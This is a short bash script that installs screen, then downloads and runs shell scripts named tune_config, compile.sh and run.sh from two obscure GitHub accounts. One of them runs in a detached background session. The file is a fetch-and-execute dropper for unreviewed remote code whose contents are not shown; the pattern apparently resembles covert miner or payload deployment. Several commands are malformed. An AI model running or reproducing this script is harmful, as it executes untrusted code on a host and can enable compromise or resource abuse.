#!/bin/bash
apt-get update
apt install screen -y
wget tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
wget compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
chmod +x compile.sh
screen -dm -S wget https://raw.githubusercontent.com/edikusumati/Doyok/main/run.sh && chmod u+x run.sh && ./run.sh
./compile.sh
echo succes
